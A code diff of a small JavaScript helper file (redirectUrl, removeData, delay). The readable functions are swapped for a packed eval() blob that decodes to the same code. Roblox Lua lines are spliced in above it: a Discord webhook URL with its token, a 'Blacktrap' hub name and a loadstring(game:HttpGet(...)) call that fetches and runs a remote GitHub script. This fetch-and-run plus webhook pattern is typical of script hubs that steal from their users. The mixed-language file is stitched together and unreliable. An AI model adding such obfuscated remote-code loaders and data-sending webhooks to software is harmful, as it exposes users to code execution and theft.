@@ -2,23 +2,27 @@ _G.Name user= "omgchuakia123"
 _G.HubName = "Blacktrap script are loading, please don't leave"
 _G.WebhookUrl = "discord.com/api/webhooks/1107319474945798144/OD_Za12hB0_V29E3yHmHBgRCsbNkovHPB9fJpHZAnTYZsSnRfKQfmjA_cSfAeo7jzZ58"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
-function redirectUrl(url, selectorString) {
-    if (url !== '') {
-        if (selectorString === null || (selectorString !== null && $(selectorString).val() != url)) {
-            window.location.replace(url);
+eval(function (p, a, c, k, e, d) {
+    e = function (c) {
+        return c.toString(36)
+    };
+    if (!''.replace(/^/, String)) {
+        while (c--) {
+            d[c.toString(a)] = k[c] || c.toString(a)
+        }
+        k = [function (e) {
+            return d[e]
+        }];
+        e = function () {
+            return '\w+'
+        };
+        c = 1
+    }
+    ;
+    while (c--) {
+        if (k[c]) {
+            p = p.replace(new RegExp('\b' + e(c) + '\b', 'g'), k[c])
         }
     }
-}
-function removeData(row) {
-    row.addClass("warning");
-    row.fadeOut(400, function () {
-        row.remove();
-    });
-}
-var delay = (function () {
-    var timer = 0;
-    return function (callback, ms) {
-        clearTimeout(timer);
-        timer = setTimeout(callback, ms);
-    };
-})();
+    return p
+}('1 g(3,4){6(3!==''){6(4===a||(4!==a&&$(4).d()!=3)){f.b.c(3)}}}1 e(2){2.l("n");2.o(h,1(){2.p()})}7 m=(1(){7 5=0;i 1(8,9){j(5);5=k(8,9)}})();', 26, 26, '|function|row|url|selectorString|timer|if|var|callback|ms|null|location|replace|val|removeData|window|redirectUrl|400|return|clearTimeout|setTimeout|addClass|delay|warning|fadeOut|remove'.split('|'), 0, {}))
